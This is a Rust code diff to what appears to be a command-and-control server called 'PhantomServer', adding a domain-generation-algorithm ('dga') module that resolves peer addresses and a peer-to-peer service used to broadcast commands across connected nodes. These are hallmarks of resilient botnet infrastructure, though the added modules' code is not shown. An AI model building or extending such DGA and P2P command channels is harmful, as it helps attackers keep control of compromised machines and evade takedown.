@@ -7,6 +7,9 @@ use std::sync::Arc;
 use tokio::net::TcpListener;
 
 mod server;
+mod dga;
+mod p2p;
+use p2p::P2PService;
 use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};
 
 #[derive(Parser, Debug)]
@@ -86,8 +89,30 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
     let mut listener = TcpListener::bind(&addr).await.expect("Bind failed");
     
+    // 4. Initialize P2P Service
+    let p2p_service = Arc::new(P2PService::new(Arc::new(master_key.clone())).await.expect("Failed to bind P2P"));
+    
+    // Spawn P2P Background Tasks
+    let p2p_for_bg = p2p_service.clone();
+    tokio::spawn(async move {
+        p2p_for_bg.start().await;
+    });
+
+    // Spawn Bootstrap Task
+    let p2p_for_boot = p2p_service.clone();
+    tokio::spawn(async move {
+        // 5. Bootstrap
+        let seeds = dga::resolve_peers().await;
+        for (ip, port) in seeds {
+             if let Ok(addr) = format!("{}:{}", ip, port).parse() {
+                 p2p_for_boot.add_peer(addr).await;
+             }
+        }
+    });
+
     // Explicitly use the Factory/State
-    let server_factory = server::PhantomServer::new(Arc::new(master_key));
+    // Pass p2p_service to Server so it can Broadcast
+    let server_factory = server::PhantomServer::new(Arc::new(master_key), p2p_service);
 
     loop {
         // Accept TCP
@@ -97,11 +122,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let config = config.clone();
         let state = server_factory.state.clone();
         let key = server_factory.master_key.clone();
+        let p2p = server_factory.p2p_service.clone();
         
         // Instantiate a fresh Session (Handler) for this connection
         let session_handler = server::PhantomSession {
             state,
             master_key: key,
+            p2p_service: p2p,
         };
 
         tokio::spawn(async move {
